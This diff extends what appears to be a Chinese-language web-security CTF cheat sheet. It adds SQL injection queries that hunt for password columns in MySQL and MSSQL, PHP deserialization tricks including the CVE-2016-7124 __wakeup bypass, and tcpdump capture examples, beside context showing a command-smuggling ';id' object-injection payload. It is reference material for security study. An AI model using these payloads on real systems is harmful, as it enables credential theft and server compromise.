@@ -513,6 +513,10 @@ cat $(ls)
     - `mid(user(), 1, 1)` => `mid(user() from 1 for 1)`
     - `UNION SELECT 1,2,3` => `UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c)`
 
+- 快速查找帶關鍵字的表
+    - `select table_schema,table_name,column_name from information_schema.columns where table_schema !=0x696E666F726D6174696F6E5F736368656D61 and table_schema !=0x6D7973716C and table_schema !=0x706572666F726D616E63655F736368656D61 and (column_name like '%pass%' or column_name like '%pwd%');
+    `
+
 ## MSSQL
 
 - 子字串：
@@ -585,6 +589,9 @@ cat $(ls)
     EXEC sp_configure'xp_cmdshell', 0;
     RECONFIGURE;
     ```
+
+- 快速查找帶關鍵字的表
+    - `SELECT sysobjects.name as tablename, syscolumns.name as columnname FROM sysobjects JOIN syscolumns ON sysobjects.id = syscolumns.id WHERE sysobjects.xtype = 'U' AND (syscolumns.name LIKE '%pass%' or syscolumns.name LIKE '%pwd%' or syscolumns.name LIKE '%first%');`
 
 ## Oracle
 
@@ -926,6 +933,9 @@ HQL injection example (pwn2win 2017)
 - png
     - `89 50 4E 47`
 
+## 其他
+- 常見場景：配合文件解析漏洞
+
 # 反序列化
 
 ## PHP - Serialize() / Unserialize()
@@ -1018,6 +1028,17 @@ HQL injection example (pwn2win 2017)
 - Input: `.php?str=O:6:"Kaibro":1:{s:12:"%00Kaibro%00test";s:3:";id";}`
 
 - Output: `uid=33(www-data) gid=33(www-data) groups=33(www-data)`
+
+---
+
+- CVE-2016-7124
+    - 物件屬性個數大於真正的屬性個數，會略過__wakeup的執行
+    - HITCON 2016 CTF
+
+- 小特性
+    - `O:+4:"test":1:{s:1:"a";s:3:"aaa";}`
+    - `O:4:"test":1:{s:1:"a";s:3:"aaa";}`
+    - 兩者結果相同
 
 
 # SSTI 
@@ -1352,6 +1373,23 @@ xxe.dtd:
     - `ＮＮ` => `..`
         - `Ｎ` 即 `\xff\x2e`
         - 轉型時捨棄第一個Byte
+
+- tcpdump
+    - `-i` 指定網卡，不指定則監控所有網卡
+    - `-s` 默認只抓96bytes，可以-s指定更大數值
+    - `-w` 指定輸出檔
+    - `host` 指定主機(ip or domain)
+    - `dst`, `src` 來源或目的端
+    - `port`指定端口
+    - `tcp`, `udp`, `icmp` 指定協議
+    - example
+        - 來源192.168.1.34且目的端口為80
+            - `tcpdump -i eth0 src 192.168.1.34 and dst port 80`
+        - 來源192.168.1.34且目的端口是22或3389
+            - `tcpdump -i eth0 'src 192.168.1.34 and (dst port 22 or 3389)'`
+        - 保存檔案，可以後續用wireshark分析
+            - `tcpdump -i eth0 src kaibro.tw -w file.cap`
+
 
 
 # Tool & Online Website
